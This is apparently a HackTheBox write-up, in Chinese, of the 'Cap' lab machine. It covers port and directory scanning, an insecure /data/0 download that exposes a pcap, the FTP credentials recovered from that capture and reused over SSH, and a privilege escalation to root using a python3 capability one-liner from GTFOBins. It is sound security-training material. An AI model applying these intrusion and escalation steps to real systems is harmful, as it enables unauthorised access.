# Cap Writeup
###### tags: `htb`
> URL : https://app.hackthebox.eu/machines/351

IP : 10.10.10.245

## Recon
- 剛開始先掃 Port
    - `rustscan -a 10.10.10.245 -r 1-65535`
        - ![](https://i.imgur.com/4gU7VjE.png)
    - `nmap -A -p21,22,80 10.10.10.245`
        - ![](https://i.imgur.com/X9G4Ex0.png)
    - 觀察有開的 port
        - 22
        - 21 : vsFTPd 3.0.3
        - 80
- 掃路徑
    - `python3 dirsearch.py -u http://10.10.10.245/`
    - ![](https://i.imgur.com/VMXpQXN.png)
    - 基本上都還是跳轉回首頁，沒什麼 QQ
- 觀察首頁
    - ![](https://i.imgur.com/CEJGwJX.png)
- 觀察下載的 `/data` 發現預設是從 2 開始
    - 嘗試改 `1` 會出現空白
    - 嘗試改 `0`
        - http://10.10.10.245/data/0
        - 可以下載到一包 pcap 檔案
- 分析 pcap 檔案
    - ![](https://i.imgur.com/zTczoQL.png)
    - 可以找到 ftp 的登入帳密
        - `nathan`
        - `Buck3tH4TF0RM3!`

## 進入系統
- 直接 ssh 連上
    - ![](https://i.imgur.com/df5oKQ6.png)
- 取得 user flag
    - ![](https://i.imgur.com/0csJWzg.png)

## 提權
- 準備 LinEnum
    - ![](https://i.imgur.com/l2wJjWi.png)
- 執行 LinEnum
    - `bash LinEnum.sh`
    - ![](https://i.imgur.com/L9Nzc9m.png)
- 發現 python3 有 capability
    - ![](https://i.imgur.com/T9C0VOz.png)
- GTFOBins 尋找 Py capability 解法
    - https://gtfobins.github.io/gtfobins/python/#capabilities
    - `/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
- 取得 Root Shell 與 Flag
    - ![](https://i.imgur.com/Hq1HAFS.png)
